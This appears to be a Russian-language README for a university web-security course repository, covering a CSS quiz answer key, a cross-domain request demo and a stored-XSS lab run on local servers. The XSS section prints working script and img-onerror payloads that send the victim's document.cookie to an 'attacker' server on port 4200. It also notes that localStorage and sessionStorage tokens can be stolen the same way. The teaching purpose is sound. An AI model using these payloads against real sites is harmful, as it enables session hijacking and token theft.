# urfu-web
A repository to hold web and dhtml course @ urfu

# 1. CSS:

Ответы на тест: 

`1 а) 2 в)`

# 2. CROSS-DOMAIN:

Базовая папка: `./cross-domain`

1. Запустить сервера 3000 и 4200

`node 3000.js`

`node 4200.js`

2. Открываем `127.0.0.1:3000` и нажимаем на кнопки

В сети в это время будут происходить кроссдоменные запросы.

# 3. XSS

Базовая папка: `./xss`

1. Запускаем сервера сайта(порт 3000) и злоумышленника(4200)

`npm install`

`node 3000.js`

`node 4200.js`

2. Переходим на форму: `127.0.0.1:3000/register`
3. Злоумышленик вводит в форму зловредный скрипт, например

```javascript
 <script>alert('your cookies have been stolen'); let stealImg = document.createElement('img');stealImg.src = 'http://127.0.0.1:4200/steal?cookie=' + document.cookie;document.body.appendChild(stealImg);</script>
 <img id="stealImg" width='0px' height='0px'><img src='' onerror="stealImg.src='http://127.0.0.1:4200/steal?cookie=' + document.cookie;">
```

4. Жертва переходит на `localhost:3000/register` и заполняет данные.
5. Жертву редиректят на тред комментариев к посту, скрипт злоумышленика подгружается как комментарий.

Что произошло?

С помощью XSS атаки через несуществующее изображение злоумышленик похитил куки у жертвы.
Стоит сказать, что дополнительно таким образом можно похитить данные sessionstorage/localstorage, в которых часто хранят различные токены


